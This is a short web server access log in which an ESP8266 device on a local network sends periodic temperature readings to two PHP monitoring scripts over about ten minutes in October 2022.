192.168.1.30 - - [31/Oct/2022:01:23:21 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:23:51 +0600] "GET /tmons/monitor.php?temperature=23.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:24:21 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:24:51 +0600] "GET /tmons/monitor.php?temperature=23.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:25:21 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:25:51 +0600] "GET /tmons/monitor.php?temperature=23.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:26:22 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:26:51 +0600] "GET /tmons/monitor.php?temperature=22.70&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:27:22 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:27:52 +0600] "GET /tmons/monitor.php?temperature=22.50&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:28:22 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:28:52 +0600] "GET /tmons/monitor.php?temperature=22.40&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:29:22 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:29:52 +0600] "GET /tmons/monitor.php?temperature=22.30&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:30:23 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:30:52 +0600] "GET /tmons/monitor.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:31:23 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:31:53 +0600] "GET /tmons/monitor.php?temperature=22.10&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:32:23 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:32:54 +0600] "GET /tmons/monitor.php?temperature=22.00&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
192.168.1.30 - - [31/Oct/2022:01:33:23 +0600] "GET /tmons/monitor2.php?temperature=21.60&server=1 HTTP/1.1" 200 - "-" "ESP8266HTTPClient"
